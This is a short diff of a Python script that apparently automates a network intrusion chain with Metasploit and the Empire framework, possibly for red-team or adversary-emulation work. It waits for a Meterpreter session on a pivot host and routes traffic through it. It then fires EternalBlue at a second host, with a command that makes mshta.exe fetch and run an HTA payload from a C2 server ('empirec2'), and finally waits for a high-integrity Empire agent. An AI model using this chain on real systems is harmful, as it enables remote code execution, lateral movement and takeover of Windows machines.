@@ -23,12 +23,13 @@ API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
 pivot_address = '192.168.181.191'
 target_address = '192.168.181.196'
 
-# wait for meterpreter
+# Step 1 - Wait for pivot
 msf_session_id = msf_wait_for_session.run(client, pivot_address)
+# Step 2 - Setup autoroute on pivot
 msf_autoroute.run(client, msf_session_id)
+# Step 3 - Launch EB payload via pivot to target
 cmd = 'mshta.exe http://empirec2:8000/o.hta'
 msf_eternal_blue.run(client, target_address, cmd)
-
-# wait for high_integrity empire agent
+# Step 4 - Wait for high_integrity empire agent
 empire_agent = empire_wait_for_agent.run(API, target_address, True)
 print(empire_agent)
